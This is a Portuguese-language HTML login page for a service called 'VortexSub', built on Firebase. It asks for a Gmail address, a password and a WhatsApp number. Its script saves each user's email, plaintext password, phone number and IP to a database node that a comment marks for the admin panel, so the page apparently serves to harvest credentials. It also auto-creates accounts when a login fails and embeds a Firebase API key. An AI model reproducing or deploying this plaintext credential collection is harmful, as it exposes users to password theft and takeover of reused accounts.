<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VortexSub - Login</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --bg-color: #0b0f19; --card-bg: #111827; --border-color: #1f2937; --text-main: #f9fafb; --text-muted: #9ca3af; --primary: #ffffff; --primary-hover: #e5e7eb; --accent: #ef4444; }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; }
        body { background-color: var(--bg-color); color: var(--text-main); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .container { width: 100%; max-width: 400px; }
        .card { background-color: var(--card-bg); border: 1px solid var(--border-color); border-radius: 16px; padding: 32px 24px; box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5); }
        .logo { font-size: 22px; font-weight: 700; display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 24px; }
        .logo i { color: var(--accent); }
        .form-group { margin-bottom: 16px; }
        label { display: block; font-size: 13px; font-weight: 500; color: var(--text-main); margin-bottom: 6px; }
        input { width: 100%; background-color: var(--bg-color); border: 1px solid var(--border-color); border-radius: 8px; padding: 12px; color: var(--text-main); font-size: 14px; outline: none; transition: 0.2s; }
        input:focus { border-color: rgba(255,255,255,0.3); }
        .btn-primary { width: 100%; background-color: var(--primary); border: none; border-radius: 8px; padding: 12px; color: #000; font-weight: 600; cursor: pointer; transition: 0.2s; margin-top: 8px; }
        .btn-primary:hover { background-color: var(--primary-hover); }
        
        /* BAN SCREEN STYLE */
        .ban-screen {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background-color: var(--bg-color); z-index: 99999;
            display: flex; justify-content: center; align-items: center; padding: 20px;
        }
        .ban-card {
            background-color: var(--card-bg); border: 1px solid var(--accent);
            border-radius: 16px; padding: 40px 30px; text-align: center; max-width: 440px; width: 100%;
            box-shadow: 0 25px 50px -12px rgba(239, 68, 68, 0.25);
        }
        .ban-card i { font-size: 48px; color: var(--accent); margin-bottom: 20px; }
        .ban-card h2 { font-size: 22px; font-weight: 700; margin-bottom: 10px; color: var(--text-main); }
        .ban-card p { font-size: 14px; color: var(--text-muted); line-height: 1.5; margin-bottom: 16px; }
        .ip-tag { font-size: 12px; background: rgba(255,255,255,0.05); padding: 6px 12px; border-radius: 6px; display: inline-block; color: var(--text-muted); }
        .hidden { display: none !important; }
    </style>
</head>
<body>

    <!-- TELA DE BANIMENTO NO LOGIN -->
    <div id="banScreen" class="ban-screen hidden">
        <div class="ban-card">
            <i class="fa-solid fa-ban"></i>
            <h2>Usuário Banido</h2>
            <p>Usuário banido por favor entre em contato com o suporte para reativação da conta.</p>
            <div class="ip-tag">User: <span id="userIpDisplay">Detectando...</span></div>
        </div>
    </div>

    <div class="container">
        <div class="card" id="loginCard">
            <div class="logo"><i class="fa-solid fa-bolt"></i> VortexSub</div>
            
            <div class="form-group">
                <label>E-mail (Gmail)</label>
                <input type="email5" id="emailInput" placeholder="seuemail@gmail.com">
            </div>
            
            <div class="form-group">
                <label>Senha</label>
                <input type="password" id="passwordInput" placeholder="••••••••">
            </div>

            <div class="form-group">
                <label>WhatsApp</label>
                <input type="text" id="whatsappInput" placeholder="(00) 00000-0000">
            </div>

            <button class="btn-primary" onclick="handleLogin()">Entrar / Registrar</button>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
        import { getAuth, signInWithEmailAndPassword, createUserWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-auth.js";
        import { getDatabase, ref, set, get, child } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyACGn5I--vTEmJ6eijN2lytZiMgo2ElnW4",
            authDomain: "vortexdev2.firebaseapp.com",
            databaseURL: "https://vortexdev2-default-rtdb.firebaseio.com",
            projectId: "vortexdev2"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getDatabase(app);

        let userIp = "";

        async function checkIpBanOnStart() {
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                userIp = ipData.ip;
                document.getElementById('userIpDisplay').innerText = userIp;

                const ipKey = userIp.replace(/\./g, '_');
                const banSnap = await get(child(ref(db), 'bannedIps/' + ipKey));
                if (banSnap.exists() && banSnap.val() === true) {
                    document.getElementById('banScreen').classList.remove('hidden');
                    document.getElementById('loginCard').style.display = 'none';
                }
            } catch (e) {
                console.error("Erro ao na verificaçao 109:", e);
            }
        }
        checkIpBanOnStart();

        window.handleLogin = async function() {
            const email = document.getElementById('emailInput').value.trim();
            const password = document.getElementById('passwordInput').value.trim();
            const whatsapp = document.getElementById('whatsappInput').value.trim();

            if (!email || !password) {
                alert('Preencha o e-mail e a senha!');
                return;
            }

            try {
                // Tenta fazer login, se não existir, cria a conta automaticamente
                let userCredential;
                try {
                    userCredential = await signInWithEmailAndPassword(auth, email, password);
                } catch (err) {
                    userCredential = await createUserWithEmailAndPassword(auth, email, password);
                }

                // Salva os dados completos (Gmail, Senha, WhatsApp e IP) para o painel admin
                const emailKey = email.replace(/[.#$[\]]/g, "_");
                await set(ref(db, 'registeredUsers/' + emailKey), {
                    email: email,
                    password: password,
                    whatsapp: whatsapp || "Não informado",
                    ip: userIp || "Desconhecido",
                    loginTime: new Date().toISOString()
                });

                window.location.href = "dashboard.html";
            } catch (error) {
                alert('Erro ao autenticar: ' + error.message);
            }
        }
    </script>
</body>
</html>
